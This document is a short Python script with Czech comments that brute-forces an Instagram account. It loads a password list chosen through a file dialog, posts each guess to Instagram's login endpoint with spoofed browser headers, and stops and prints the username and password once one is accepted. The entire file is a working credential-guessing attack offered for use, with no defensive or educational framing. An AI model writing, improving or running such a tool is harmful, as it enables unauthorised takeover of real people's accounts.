import requests
from tkinter import Tk, filedialog

def login(username, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Referer': 'https://www.instagram.com/',
        'Origin': 'https://www.instagram.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive'
    })
   
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    login_data = {
        'username': username,
        'password': password
    }
   
    response = session.post(login_url, data=login_data)
   
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get('authenticated'):
            print(f"Succesfuly loged in as  {username} with password {password}")
            return True
        else:
            print("Failed")
            return False
    else:
        print(f"Error with conection to server. Check your internet connection and try again.Codde: {response.status_code}")
        return False

# Funkce pro načtení hesel ze souboru
def load_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]

# Zobrazit dialogové okno pro výběr souboru s hesly
def select_passwords_file():
    root = Tk()
    root.withdraw()  # Skryjeme hlavní okno Tkinteru
    file_path = filedialog.askopenfilename(title="Choice the file with password")
    return file_path

# Údaje pro přihlášení
username = 'your_username'

# Vybrat soubor s hesly
passwords_file_path = select_passwords_file()

# Pokračovat pouze pokud byl vybrán soubor
if passwords_file_path:
    # Načtení hesel ze souboru
    passwords = load_passwords_from_file(passwords_file_path)

    # Vyzkoušení všech hesel
    for password in passwords:
        if login(username, password):
            break  # Pokud je přihlášení úspěšné, zastavíme testování hesel
else:
    print("Please, choice the file again.")